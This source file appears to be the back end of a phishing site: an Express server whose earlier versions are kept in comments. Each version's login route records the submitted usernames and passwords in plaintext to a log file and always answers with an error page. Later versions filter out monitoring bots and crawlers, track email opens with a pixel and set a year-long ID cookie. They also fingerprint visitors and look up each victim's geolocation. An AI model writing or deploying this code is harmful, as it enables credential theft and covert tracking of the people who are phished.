// const express = require('express');
// const path = require('path');
// const bodyParser = require('body-parser');

// const app = express();
// const PORT = 3000;

// app.use(bodyParser.urlencoded({ extended: false }));
// app.use(express.static(path.join(__dirname, 'public')));

// app.get('/', (req, res) => {
//   console.log(`Page visited by: ${req.ip} at ${new Date().toISOString()}`);
//   res.sendFile(path.join(__dirname, 'index.html'));
// });

// app.post('/login', (req, res) => {
//   const { username, password } = req.body;
//   console.log(`Username: ${username}, Password: ${password}`);
//   res.sendFile(path.join(__dirname, 'error.html'));
// });

// app.listen(PORT, () => {
//   console.log(`Server running on http://localhost:${PORT}`);
// });


// const express = require('express');
// const path = require('path');
// const bodyParser = require('body-parser');
// const fs = require('fs');

// const app = express();
// const PORT = 3000;

// app.use(bodyParser.urlencoded({ extended: false }));
// app.use(express.static(path.join(__dirname, 'public')));

// // Helper to check if request is likely from a bot
// function isBot(userAgent) {
//   if (!userAgent) return true;
//   const botKeywords = ['UptimeRobot', 'Pingdom', 'curl', 'bot', 'spider'];
//   return botKeywords.some(keyword => userAgent.toLowerCase().includes(keyword.toLowerCase()));
// }

// app.get('/', (req, res) => {
//   const userAgent = req.headers['user-agent'] || '';
//   const ip = req.ip;
//   const timestamp = new Date().toISOString();

//   if (!isBot(userAgent)) {
//     const log = `VISIT -> IP: ${ip}, Time: ${timestamp}, UA: ${userAgent}\n`;
//     console.log(log);
//     fs.appendFile('visits.log', log, err => {
//       if (err) console.error('Log error:', err);
//     });
//   } else {
//     console.log(`Bot ping detected from: ${ip} [${userAgent}]`);
//   }

//   res.sendFile(path.join(__dirname, 'index.html'));
// });

// app.post('/login', (req, res) => {
//   const { username, password } = req.body;
//   const ip = req.ip;
//   const timestamp = new Date().toISOString();
//   const userAgent = req.headers['user-agent'] || '';

//   if (!isBot(userAgent)) {
//     const log = `LOGIN -> ${timestamp} | IP: ${ip} | Username: ${username} | Password: ${password}\n`;
//     console.log(log);
//     fs.appendFile('logins.log', log, err => {
//       if (err) console.error('Login log error:', err);
//     });
//   } else {
//     console.log(`Bot POST detected. UA: ${userAgent}`);
//   }

//   res.sendFile(path.join(__dirname, 'error.html'));
// });

// app.listen(PORT, () => {
//   console.log(`Server running on http://localhost:${PORT}`);
// });



// const express = require('express');
// const path = require('path');
// const bodyParser = require('body-parser');
// const fs = require('fs');

// const app = express();
// const PORT = 3000;

// app.use(bodyParser.urlencoded({ extended: false }));
// app.use(express.static(path.join(__dirname, 'public')));

// // Helper to check if request is likely from a bot
// function isBot(userAgent) {
//   if (!userAgent) return true;
//   const botKeywords = ['UptimeRobot', 'Pingdom', 'curl', 'bot', 'spider'];
//   return botKeywords.some(keyword => userAgent.toLowerCase().includes(keyword.toLowerCase()));
// }

// app.get('/', (req, res) => {
//   const userAgent = req.headers['user-agent'] || '';
//   const ip = req.headers['x-forwarded-for'] || req.ip;
//   const timestamp = new Date().toISOString();

//   if (!isBot(userAgent)) {
//     const log = `VISIT -> IP: ${ip}, Time: ${timestamp}, UA: ${userAgent}\n`;
//     console.log(log);
//     fs.appendFile('visits.log', log, err => {
//       if (err) console.error('Log error:', err);
//     });
//   } else {
//     console.log(`Bot ping detected from: ${ip} [${userAgent}]`);
//   }

//   res.sendFile(path.join(__dirname, 'index.html'));
// });

// app.post('/login', (req, res) => {
//   const { username, password } = req.body;
//   const ip = req.headers['x-forwarded-for'] || req.ip;
//   const timestamp = new Date().toISOString();
//   const userAgent = req.headers['user-agent'] || '';

//   if (!isBot(userAgent)) {
//     const log = `LOGIN -> ${timestamp} | IP: ${ip} | Username: ${username} | Password: ${password}\n`;
//     console.log(log);
//     fs.appendFile('logins.log', log, err => {
//       if (err) console.error('Login log error:', err);
//     });
//   } else {
//     console.log(`Bot POST detected. UA: ${userAgent}`);
//   }

//   res.sendFile(path.join(__dirname, 'error.html'));
// });

// // Email open tracking pixel
// app.get('/tracker.gif', (req, res) => {
//   const userAgent = req.headers['user-agent'] || '';
//   const ip = req.headers['x-forwarded-for'] || req.ip;
//   const timestamp = new Date().toISOString();

//   if (!isBot(userAgent)) {
//     const log = `TRACK -> IP: ${ip}, Time: ${timestamp}, UA: ${userAgent}\n`;
//     console.log(log);
//     fs.appendFile('opens.log', log, err => {
//       if (err) console.error('Tracker log error:', err);
//     });
//   }

//   // 1x1 transparent GIF
//   const gif = Buffer.from(
//     'R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==',
//     'base64'
//   );
//   res.set('Content-Type', 'image/gif');
//   res.set('Content-Length', gif.length);
//   res.send(gif);
// });

// app.listen(PORT, () => {
//   console.log(`Server running on http://localhost:${PORT}`);
// });


// const express = require('express');
// const path = require('path');
// const bodyParser = require('body-parser');
// const fs = require('fs');

// const app = express();
// const PORT = 3000;

// app.use(bodyParser.urlencoded({ extended: false }));
// app.use(express.static(path.join(__dirname, 'public')));

// // Enhanced bot detection
// function isBot(userAgent) {
//   if (!userAgent) return true;
//   const botKeywords = [
//     'uptime', 'pingdom', 'curl', 'bot', 'spider', 'crawler',
//     'go-http-client', 'axios', 'fetch', 'monitor'
//   ];
//   return botKeywords.some(keyword =>
//     userAgent.toLowerCase().includes(keyword)
//   );
// }

// // Homepage route
// app.get('/', (req, res) => {
//   const userAgent = req.headers['user-agent'] || '';
//   const ip = req.headers['x-forwarded-for'] || req.ip;
//   const timestamp = new Date().toISOString();

//   if (isBot(userAgent)) {
//     // Ignore bots completely — no log, no file serving
//     return res.status(204).end();
//   }

//   const log = `VISIT -> IP: ${ip}, Time: ${timestamp}, UA: ${userAgent}\n`;
//   console.log(log);
//   fs.appendFile('visits.log', log, err => {
//     if (err) console.error('Log error:', err);
//   });

//   res.sendFile(path.join(__dirname, 'index.html'));
// });

// // Login route
// app.post('/login', (req, res) => {
//   const { username, password } = req.body;
//   const ip = req.headers['x-forwarded-for'] || req.ip;
//   const timestamp = new Date().toISOString();
//   const userAgent = req.headers['user-agent'] || '';

//   if (isBot(userAgent)) {
//     // Ignore bot POST requests
//     return res.status(204).end();
//   }

//   const log = `LOGIN -> ${timestamp} | IP: ${ip} | Username: ${username} | Password: ${password}\n`;
//   console.log(log);
//   fs.appendFile('logins.log', log, err => {
//     if (err) console.error('Login log error:', err);
//   });

//   res.sendFile(path.join(__dirname, 'error.html'));
// });

// // Email open tracking route
// app.get('/tracker.gif', (req, res) => {
//   const userAgent = req.headers['user-agent'] || '';
//   const ip = req.headers['x-forwarded-for'] || req.ip;
//   const timestamp = new Date().toISOString();

//   if (isBot(userAgent)) {
//     // Ignore tracker hits by bots
//     return res.status(204).end();
//   }

//   const log = `TRACK -> IP: ${ip}, Time: ${timestamp}, UA: ${userAgent}\n`;
//   console.log(log);
//   fs.appendFile('opens.log', log, err => {
//     if (err) console.error('Tracker log error:', err);
//   });

//   // Send 1x1 transparent GIF
//   const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==', 'base64');
//   res.set('Content-Type', 'image/gif');
//   res.set('Content-Length', gif.length);
//   res.send(gif);
// });

// // Start server
// app.listen(PORT, () => {
//   console.log(`Server running on http://localhost:${PORT}`);
// });


const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const fs = require('fs');
const crypto = require('crypto');
const geoip = require('geoip-lite');
const fetch = require('node-fetch'); // npm i node-fetch@2
const { v4: uuidv4 } = require('uuid'); // npm i uuid
const cookieParser = require('cookie-parser');

const app = express();
const PORT = 3000;

app.use(cookieParser());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json()); // for JSON device info POST
app.use(express.static(path.join(__dirname, 'public')));

// Enhanced bot detection
function isBot(userAgent) {
  if (!userAgent) return true;
  const botKeywords = [
    'uptime', 'pingdom', 'curl', 'bot', 'spider', 'crawler',
    'go-http-client', 'axios', 'fetch', 'monitor'
  ];
  return botKeywords.some(keyword =>
    userAgent.toLowerCase().includes(keyword)
  );
}

// Get client IP
function getClientIP(req) {
  const xff = req.headers['x-forwarded-for'];
  if (xff) return xff.split(',')[0].trim();
  return req.ip;
}

// Fingerprint from UA + Accept-Language + user_id cookie + IP
function generateFingerprint({ userAgent, acceptLanguage, userId, ip }) {
  const input = `${userAgent}||${acceptLanguage}||${userId || 'none'}||${ip}`;
  return crypto.createHash('sha256').update(input).digest('hex').slice(0, 16);
}

// Fetch detailed geo info from external API (ipapi.co)
async function fetchGeoDetails(ip) {
  try {
    const res = await fetch(`https://ipapi.co/${ip}/json/`);
    if (!res.ok) throw new Error('Failed to fetch geo info');
    const data = await res.json();
    return {
      country: data.country_name || 'N/A',
      region: data.region || 'N/A',
      city: data.city || 'N/A',
      postal: data.postal || 'N/A',
      latitude: data.latitude || 'N/A',
      longitude: data.longitude || 'N/A',
      isp: data.org || 'N/A',
      org: data.org || 'N/A',
      networkType: data.asn ? data.asn.description || 'N/A' : 'N/A'
    };
  } catch (err) {
    return null;
  }
}

// Serve homepage + set user_id cookie + inject JS to collect device info
app.get('/', (req, res) => {
  const userAgent = req.headers['user-agent'] || '';
  if (isBot(userAgent)) return res.status(204).end();

  let userId = req.cookies.user_id;
  if (!userId) {
    userId = uuidv4();
    res.cookie('user_id', userId, { maxAge: 365 * 24 * 60 * 60 * 1000 }); // 1 year
  }

  res.sendFile(path.join(__dirname, 'index.html'));
});

// Endpoint to receive device info from client JS
app.post('/deviceinfo', async (req, res) => {
  const userAgent = req.headers['user-agent'] || '';
  if (isBot(userAgent)) return res.status(204).end();

  const ip = getClientIP(req);
  const timestamp = new Date().toISOString();
  const referer = req.headers['referer'] || 'N/A';
  const acceptLanguage = req.headers['accept-language'] || 'N/A';
  const cookies = req.headers['cookie'] || 'N/A';
  const userId = req.cookies.user_id || 'N/A';

  const fingerprint = generateFingerprint({ userAgent, acceptLanguage, userId, ip });
  const deviceInfo = req.body || {};

  // Fetch geo details asynchronously, but don't delay response
  fetchGeoDetails(ip).then(geo => {
    const geoInfo = geo
      ? `Country: ${geo.country}, Region: ${geo.region}, City: ${geo.city}, Postal: ${geo.postal}, Lat: ${geo.latitude}, Lon: ${geo.longitude}, ISP: ${geo.isp}, Org: ${geo.org}, NetworkType: ${geo.networkType}`
      : 'Geo info unavailable';

    const log = `DEVICEINFO -> Time: ${timestamp}, IP: ${ip}, Fingerprint: ${fingerprint}, UA: ${userAgent}, Referer: ${referer}, Accept-Language: ${acceptLanguage}, Cookies: ${cookies}, UserID: ${userId}, DeviceInfo: ${JSON.stringify(deviceInfo)}, Geo: ${geoInfo}\n`;

    console.log(log);
    fs.appendFile('deviceinfo.log', log, err => {
      if (err) console.error('Device info log error:', err);
    });
  });

  res.status(200).json({ status: 'ok' });
});

// Login route
app.post('/login', async (req, res) => {
  const userAgent = req.headers['user-agent'] || '';
  if (isBot(userAgent)) return res.status(204).end();

  const ip = getClientIP(req);
  const timestamp = new Date().toISOString();
  const referer = req.headers['referer'] || 'N/A';
  const acceptLanguage = req.headers['accept-language'] || 'N/A';
  const cookies = req.headers['cookie'] || 'N/A';
  const userId = req.cookies.user_id || 'N/A';

  const { username, password, deviceInfo } = req.body;

  const fingerprint = generateFingerprint({ userAgent, acceptLanguage, userId, ip });

  // Fetch geo details asynchronously, but don't delay response
  fetchGeoDetails(ip).then(geo => {
    const geoInfo = geo
      ? `Country: ${geo.country}, Region: ${geo.region}, City: ${geo.city}, Postal: ${geo.postal}, Lat: ${geo.latitude}, Lon: ${geo.longitude}, ISP: ${geo.isp}, Org: ${geo.org}, NetworkType: ${geo.networkType}`
      : 'Geo info unavailable';

    // WARNING: logging raw passwords is insecure - do NOT do this in production
    const log = `LOGIN -> Time: ${timestamp}, IP: ${ip}, Fingerprint: ${fingerprint}, Username: ${username}, Password: ${password}, UA: ${userAgent}, Referer: ${referer}, Accept-Language: ${acceptLanguage}, Cookies: ${cookies}, UserID: ${userId}, DeviceInfo: ${JSON.stringify(deviceInfo)}, Geo: ${geoInfo}\n`;

    console.log(log);
    fs.appendFile('logins.log', log, err => {
      if (err) console.error('Login log error:', err);
    });
  });

  res.sendFile(path.join(__dirname, 'error.html'));
});

// Tracker route remains simple
app.get('/tracker.gif', (req, res) => {
  const userAgent = req.headers['user-agent'] || '';
  if (isBot(userAgent)) return res.status(204).end();

  const ip = getClientIP(req);
  const timestamp = new Date().toISOString();

  const log = `TRACK -> IP: ${ip}, Time: ${timestamp}, UA: ${userAgent}\n`;
  console.log(log);
  fs.appendFile('opens.log', log, err => {
    if (err) console.error('Tracker log error:', err);
  });

  // Send 1x1 transparent GIF
  const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==', 'base64');
  res.set('Content-Type', 'image/gif');
  res.set('Content-Length', gif.length);
  res.send(gif);
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});



